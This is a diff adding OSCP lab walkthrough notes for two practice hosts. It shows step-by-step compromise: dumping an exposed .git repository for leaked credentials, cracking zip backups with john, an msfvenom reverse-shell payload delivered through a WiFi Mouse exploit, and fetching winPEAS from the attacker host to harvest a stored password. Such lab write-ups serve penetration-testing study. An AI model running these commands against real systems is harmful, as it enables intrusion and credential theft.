@@ -759,15 +759,298 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 18.79 seconds
 ```
 
+3. Found out .git sub-directory so, download everything to local machine using git dumper. 
+```
+https://github.com/arthaud/git-dumper
+
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ ./git_dumper.py http://192.168.218.144/.git . 
+```
+
+4. Check out git commits. Find out ssh creds. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ git show                                                   
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+diff --git a/configuration/database.php b/configuration/database.php
+index 55b1645..8ad08b0 100644
+--- a/configuration/database.php
++++ b/configuration/database.php
+@@ -2,8 +2,9 @@
+ class Database{
+     private $host = "localhost";
+     private $db_name = "staff";
+-    private $username = "stuart@challenge.lab";
+-    private $password = "BreakingBad92";
++    private $username = "";
++    private $password = "";
++// Cleartext creds cannot be added to public repos!
+     public $conn;
+     public function getConnection() {
+         $this->conn = null;
+
+Stuart:BreakingBad92
+
+```
+
+5. SSH login. and thoroughly check each folder. Obtained local.txt 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ ssh stuart@192.168.218.144   
+
+stuart@oscp:~$ cat local.txt
+fb4cbe759601ac9ebf7ccc27e3a228d0
+```
+
+6. Found three backup zip files. and transfer them to local machine. 
+```
+stuart@oscp:/opt/backup$ ls
+sitebackup1.zip  sitebackup2.zip  sitebackup3.zip
+
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ sudo systemctl start ssh 
+
+stuart@oscp:/opt/backup$ scp sitebackup1.zip kali@192.168.45.242:/home/kali/OSCP/labs/oscpa/
+The authenticity of host '192.168.45.242 (192.168.45.242)' can't be established.
+ED25519 key fingerprint is SHA256:iiY1KYmCzkekH79Vu14hbceL14X6b2ROAhqQCN+Lyew.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.45.242' (ED25519) to the list of known hosts.
+kali@192.168.45.242's password: 
+sitebackup1.zip                           100%   26KB  40.8KB/s   00:00    
+stuart@oscp:/opt/backup$ scp sitebackup2.zip kali@192.168.45.242:/home/kali/OSCP/labs/oscpa/
+kali@192.168.45.242's password: 
+sitebackup2.zip                           100%   24KB  36.9KB/s   00:00    
+stuart@oscp:/opt/backup$ scp sitebackup3.zip kali@192.168.45.242:/home/kali/OSCP/labs/oscpa/
+kali@192.168.45.242's password: 
+sitebackup3.zip  
+```
+
+6. Crack sitebackup3.zip
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ zip2john sitebackup3.zip > hash1
+
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ john -w=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
+Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
+codeblue         (sitebackup3.zip/joomla/includes/app.php)     
+codeblue         (sitebackup3.zip/joomla/web.config.txt)     
+codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
+codeblue         (sitebackup3.zip/joomla/cli/index.html)     
+codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
+codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
+codeblue         (sitebackup3.zip/joomla/includes/index.html)     
+codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
+codeblue         (sitebackup3.zip/joomla/cache/index.html)     
+codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
+codeblue         (sitebackup3.zip/joomla/README.txt)     
+codeblue         (sitebackup3.zip/joomla/language/index.html)     
+codeblue         (sitebackup3.zip/joomla/.DS_Store)     
+codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
+codeblue         (sitebackup3.zip/joomla/index.php)     
+codeblue         (sitebackup3.zip/joomla/configuration.php)     
+codeblue         (sitebackup3.zip/joomla/robots.txt)     
+codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
+19g 0:00:00:11 DONE (2024-02-18 20:03) 1.656g/s 3571p/s 67850c/s 67850C/s holabebe..loserface1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+7. Unzip configuration.php and find chloe creds. 
+```
+public $secret = 'Ee24zIK4cDhJHL4H';
+```
+
+8. Change user to chloe, figured out it was root user and get proof.txt
+```
+stuart@oscp:/home$ su chloe
+Password: Ee24zIK4cDhJHL4H
 
 
+chloe@oscp:~$ sudo -l
+[sudo] password for chloe: 
+Matching Defaults entries for chloe on oscp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
 
+User chloe may run the following commands on oscp:
+    (ALL : ALL) ALL
+chloe@oscp:~$ sudo su
+root@oscp:/home/chloe# ls
+root@oscp:/home/chloe# cd /root
+root@oscp:~# ls
+proof.txt  snap
+root@oscp:~# cat proof.txt
+3c52cb51458b65d1eda98c6ffada69c9
 
-
-
+```
 
 #### 145
+1. Rustscan 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ rustscan 192.168.213.145 
 
+PORT     STATE SERVICE       REASON
+21/tcp   open  ftp           syn-ack
+80/tcp   open  http          syn-ack
+135/tcp  open  msrpc         syn-ack
+139/tcp  open  netbios-ssn   syn-ack
+445/tcp  open  microsoft-ds  syn-ack
+1978/tcp open  unisql        syn-ack
+3389/tcp open  ms-wbt-server syn-ack
+```
+
+3. Nmap scan 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ nmap -p$(cat 145-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.213.145 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 20:56 EST
+Nmap scan report for 192.168.213.145
+Host is up (0.31s latency).
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Samuel's Personal Site
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1978/tcp open  unisql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    system windows 6.2
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-02-19T02:00:24+00:00; +1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2024-02-19T01:59:45+00:00
+| ssl-cert: Subject: commonName=oscp
+| Not valid before: 2023-11-29T11:57:43
+|_Not valid after:  2024-05-30T11:57:43
+1 service unrecognized despite returning data. If you know the sern, please submit the following fingerprint at https://nmap.org/cgi.cgi?new-service :
+SF-Port1978-TCP:V=7.94SVN%I=7%D=2/18%Time=65D2B56E%P=x86_64-pc-lin
+SF:(NULL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"sy
+SF:windows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.
+SF:r(HTTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest
+SF:tem\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x
+SF:\n")%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")
+SF:atusRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"s
+SF:0windows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x2
+SF:n")%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%
+SF:sionReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"syst
+SF:ndows\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\
+SF:X11Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourReques
+SF:stem\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows
+SF:\n\n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LD
+SF:q,14,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x
+SF:s\x206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n"
+SF:inalServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system
+SF:ows\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n"
+SF:RMI,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system
+SF:ows\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\
+SF:-sql-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20
+SF:x206\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-02-19T01:59:46
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results amap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 212.21 seconds
+```
+
+3. Found out service unisql which was vulnerable to wifi mouse from google
+```
+https://www.exploit-db.com/exploits/50972
+```
+
+4. Prepare exploits
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=443 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ python 50972.py 192.168.213.145 192.168.45.242 reverse.exe
+[+] 3..2..1..
+[+] *Super fast hacker typing*
+[+] Retrieving payload
+[+] Done! Check Your Listener?
+
+```
+
+5. Obtained reverse shell and local.txt
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ nc -nvlp 443 
+listening on [any] 443 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.213.145] 53348
+Microsoft Windows [Version 10.0.19041.1]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>ls
+
+C:\Users\offsec\Desktop>type local.txt
+type local.txt
+5d2a5ee73bdaee89081a92608b3cee2d
+
+```
+
+6. Found another user zachary as administrator and run winpeas. Found password ot zachary. 
+```
+PS C:\Users\offsec\Desktop> iwr -uri http://192.168.45.242/winPEASx64.exe -Outfile winpeas.exe
+iwr -uri http://192.168.45.242/winPEASx64.exe -Outfile winpeas.exe
+PS C:\Users\offsec\Desktop> .\winpeas.exe
+
+
+   RegKey Name: zachary
+    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
+
+```
+
+7. RDP login and found proof on admin desktop. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpa]
+└─$ xfreerdp /cert-ignore /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.213.145 
+
+
+91fb41464003a662f05530d761274cb9
+```
 
 
 
